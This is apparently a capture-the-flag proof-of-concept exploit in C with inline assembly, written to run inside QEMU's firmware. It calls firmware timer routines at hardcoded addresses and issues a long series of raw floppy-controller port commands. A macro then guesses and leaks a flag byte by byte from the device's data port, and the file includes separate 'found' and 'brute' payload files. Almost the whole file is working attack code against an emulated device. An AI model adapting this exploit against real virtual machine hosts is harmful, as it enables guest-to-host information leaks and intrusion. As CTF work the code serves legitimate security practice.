//  0x000F91E4 in ida = 0x7fbd8a4 in qemu
// add 7EC46C0 to addresses

#define outb(val, port) asm volatile ("mov $" #val ", %%eax; mov $" #port ", %%edx; out %%al, %%dx" ::: "edx", "eax")
#define inb(port) asm volatile ("mov $" # port ", %%edx; in %%dx, %%al" ::: "edx", "eax")
#define inb2(port, out) asm volatile ("mov $" # port ", %%edx; in %%dx, %%al; mov %%al, %0" : "=r"(out) :: "edx", "eax")

// timer_calc at F2D6F = 0x7FB742F
unsigned int timer_calc(int ms) {
    unsigned int out;
    asm volatile (
        "mov %0, %%eax; mov $0x7FB742F, %%ebx; call *%%ebx; mov %%eax, %1"
        : "=r"(out)
        : "r"(ms)
        :
        "eax", "ebx", "ecx", "edx", "cc", "memory"
    );
    return out;
}

unsigned int timer_check(unsigned int time) {
    // timer_check at 0F2D82 = 0x7FB7442
    unsigned int out;
    asm volatile (
        "mov %0, %%eax; mov $0x7FB7442, %%ebx; call *%%ebx; mov %%eax, %1"
        : "=r"(out)
        : "r"(time)
        :
        "eax", "ebx", "ecx", "edx", "cc", "memory"
    );
    return out;
}

void timer_sleep(unsigned int end)
{
    while (!timer_check(end))
        asm volatile ("pause");
}

void msleep(unsigned int count) {
    timer_sleep(timer_calc(count));
}

// QEMU ACPI Shutdown
__attribute__((noreturn))
void shutdown() {
    asm volatile("mov $0x604,%edx; mov $0x2000,%eax; out %ax,%dx; hlt;");
    __builtin_unreachable();
}

// 0x7fbd8a4
// our code at 0x000F91E4 in ida = 0x7fbd8a4 in qemu
void try_bullshit(void)
{
    // Floppy_drive_recal 0
    // Floppy_enable_controller
    outb(0x08,0x03f2);
    msleep(100);
    outb(0x0c,0x03f2);
    msleep(100);
    // Floppy pio command 2008
    inb(0x03f4);
    outb(0x08,0x03f5);
    msleep(100);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    // Floppy pio command 2008
    inb(0x03f4);
    outb(0x08,0x03f5);
    msleep(100);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    // Floppy pio command 2008
    inb(0x03f4);
    outb(0x08,0x03f5);
    msleep(100);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    // Floppy pio command 2008
    inb(0x03f4);
    outb(0x08,0x03f5);
    msleep(100);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    outb(0x1c,0x03f2);
    msleep(100);
    // Floppy pio command 10107
    inb(0x03f4);
    outb(0x07,0x03f5);
    msleep(100);
    inb(0x03f4);
    outb(0x00,0x03f5);
    msleep(100);
    inb(0x03f4);
    // Floppy pio command 2008
    inb(0x03f4);
    outb(0x08,0x03f5);
    msleep(100);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    outb(0x00,0x03f7);
    msleep(100);
    outb(0x1c,0x03f2);
    msleep(100);
    // Floppy pio command 1714a
    inb(0x03f4);
    outb(0x4a,0x03f5);
    msleep(100);
    inb(0x03f4);
    outb(0x00,0x03f5);
    msleep(100);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    inb(0x03f5);
    inb(0x03f4);
    // Floppy_media_sense on drive 0 found rate 0
    // Floppy pio command 203
    inb(0x03f4);
    outb(0x03,0x03f5);
    msleep(100);
    inb(0x03f4);
    outb(0xaf,0x03f5);
    msleep(100);
    inb(0x03f4);
    outb(0x02,0x03f5);
    msleep(100);
    inb(0x03f4);
    outb(0x1c,0x03f2);
    msleep(100);
    // Floppy pio command 178e6
    inb(0x03f4);
    outb(0xe6,0x03f5);
    msleep(100);
    inb(0x03f4);
    outb(0x04,0x03f5);
    msleep(100);
    inb(0x03f4);
    outb(0x00,0x03f5);
    msleep(100);
    inb(0x03f4);
    outb(0x01,0x03f5);
    msleep(100);
    inb(0x03f4);
    outb(0x11,0x03f5);
    msleep(100);
    inb(0x03f4);
    outb(0x02,0x03f5);
    msleep(100);
    inb(0x03f4);
    outb(0x11,0x03f5);
    msleep(100);
    inb(0x03f4);
    outb(0x1b,0x03f5);
    msleep(100);
    inb(0x03f4);
    outb(0xff,0x03f5);
    msleep(100);

    char flag;
#define GUESS(cond) do { inb2(0x03f5, flag); if (!(cond)) for(;;); } while(0)
    inb(0x03f5);
    inb(0x03f5);
    inb(0x03f5);
    inb(0x03f5);
    // GUESS(flag == 'O');
    // GUESS(flag == 'O');
    // GUESS(flag == 'O');
    // GUESS(flag == '{');
#include "poc_found.c"
#include "poc_brute.c"
    shutdown();

    // printf("final fuck up goes here\n");

    // printf("flag is: ");
    // printf("%c", inb(0x03f5));
    // printf("%c", inb(0x03f5));
    // printf("%c", inb(0x03f5));
    // printf("%c", inb(0x03f5));
    // printf("%c", inb(0x03f5));
    // printf("%c", inb(0x03f5));
    // printf("%c", inb(0x03f5));
    // printf("%c", inb(0x03f5));
    // printf("%c", inb(0x03f5));
    // printf("%c", inb(0x03f5));
    // printf("%c", inb(0x03f5));
    // printf("%c", inb(0x03f5));
    // printf("%c", inb(0x03f5));
    // printf("%c", inb(0x03f5));
    // printf("\n");
}

void poc_main(void) {
    try_bullshit();
}
